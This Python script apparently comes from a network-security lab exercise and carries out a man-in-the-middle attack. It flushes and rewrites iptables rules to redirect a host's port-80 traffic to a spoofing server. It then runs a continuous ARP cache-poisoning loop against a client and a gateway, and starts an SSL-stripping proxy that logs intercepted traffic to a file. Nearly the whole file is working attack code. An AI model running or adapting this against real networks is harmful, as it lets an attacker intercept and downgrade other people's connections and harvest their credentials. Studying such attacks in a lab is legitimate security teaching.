import os
import subprocess

import re

from multiprocessing import Process

from scapy.all import *

from server import run_server

def init():
    #reset
    subprocess.call('iptables -F'.split(' '))
    subprocess.call('iptables -F -t nat'.split(' '))
    subprocess.call('iptables -F -t mangle'.split(' '))
    # iptables set up
    subprocess.call('iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE'.split(' '))
    subprocess.call('iptables -A FORWARD -i eth0 -o eth1 -m state --state RELATED,ESTABLISHED -j ACCEPT'.split(' '))
    subprocess.call('iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT'.split(' '))
    # redirect to spoofer
    subprocess.call('iptables -t nat -A PREROUTING -p tcp -i eth0 -d 142.1.97.172 --dport 80 -j DNAT --to-destination 10.0.0.3:8080'.split(' '))

# CODE FROM https://medium.com/@ismailakkila/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242
def getMACFromIP(ip):
    arp = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip)
    resp, unans = srp(arp, verbose=False)

    for se, rec in resp:
        return rec[Ether].src
    # can't find
    return ""

def arp_spoof():
    client = getMACFromIP('10.0.0.2')
    gate = getMACFromIP('10.0.0.1')

    # CODE FROM https://medium.com/@ismailakkila/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242
    while True:
        send(ARP(hwdst=gate, pdst='10.0.0.2', psrc='10.0.0.1'), verbose=False)
        send(ARP(hwsrc=client, pdst='10.0.0.1', psrc='10.0.0.2'), verbose=False)


def ssl_stripping():
    # Use the sslstripping command at first 
    subprocess.call('python3 /shared/server.py -a -w /shared/log.txt -l 8080 -f'.split(' '))  
    # but the final attack should use your own HTTP server that will do the stripping

def run():
    arp_process = Process(target=arp_spoof)
    stripping_process = Process(target=ssl_stripping)
    arp_process.start()
    stripping_process.start()
    stripping_process.join()
    arp_process.terminate()

if __name__ == "__main__":
    init()
    run()
